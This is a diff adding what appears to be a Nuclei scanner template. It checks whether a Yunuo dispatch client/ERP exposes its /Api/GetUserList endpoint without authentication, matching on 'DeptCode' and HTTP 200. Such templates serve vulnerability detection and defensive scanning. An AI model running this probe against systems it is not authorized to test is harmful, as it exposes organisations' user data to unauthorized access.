@@ -1,0 +1,24 @@
+id: yunuo-ERP-GetUserList-unauth
+
+info:
+  name: 雨诺调度客户端 GetUserList 存在任未授权访问漏洞
+  author: yunuo
+  severity: high
+  tags: yunuo,ERP,unauth
+
+http:
+  - raw:
+      - |
+        GET /Api/GetUserList HTTP/1.1
+        Host: {{Hostname}} 
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
+        
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'DeptCode'
+      - type: status
+        status: 
+          - 200
